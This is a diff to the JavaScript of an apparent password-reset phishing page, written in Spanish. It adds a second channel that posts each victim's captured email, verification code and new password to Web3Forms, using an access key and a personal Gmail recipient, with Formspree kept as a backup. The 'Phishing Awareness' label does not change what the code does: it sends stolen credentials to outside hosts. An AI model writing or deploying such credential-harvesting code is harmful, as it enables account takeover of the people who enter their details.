@@ -141,8 +141,39 @@ function sendCapturedData(email, code, newPassword) {
 ═══════════════════════════════════════════
     `;
     
-    // Enviar con Formspree
-    console.log('📤 Enviando datos capturados...');
+    // Método 1: Web3Forms (más confiable para Netlify)
+    console.log('📤 Enviando con Web3Forms...');
+    const formData = new FormData();
+    formData.append('access_key', '38e2db25-d16e-4fb3-b632-be632c018a69');
+    formData.append('subject', `🔐 Reset Password - ${email}`);
+    formData.append('from_name', 'Sistema de Phishing Awareness');
+    formData.append('email', 'sofly7899@gmail.com');
+    formData.append('message', mensaje);
+    formData.append('email_capturado', email);
+    formData.append('codigo_ingresado', code);
+    formData.append('nueva_password', newPassword);
+    formData.append('tipo_captura', 'password_reset');
+    formData.append('fecha_hora', timestamp);
+    
+    fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Web3Forms respuesta:', data);
+        if (data.success) {
+            console.log('✅ Email enviado exitosamente por Web3Forms');
+        } else {
+            console.error('❌ Error en Web3Forms:', data.message);
+        }
+    })
+    .catch(error => {
+        console.error('❌ Error con Web3Forms:', error);
+    });
+    
+    // Método 2: Formspree (backup)
+    console.log('📤 Enviando con Formspree como backup...');
     fetch('https://formspree.io/f/xanyevdp', {
         method: 'POST',
         headers: {
@@ -162,10 +193,7 @@ function sendCapturedData(email, code, newPassword) {
             fecha_hora: timestamp
         })
     })
-    .then(response => {
-        console.log('Formspree status:', response.status);
-        return response.json();
-    })
+    .then(response => response.json())
     .then(data => {
         console.log('✅ Formspree respuesta:', data);
     })
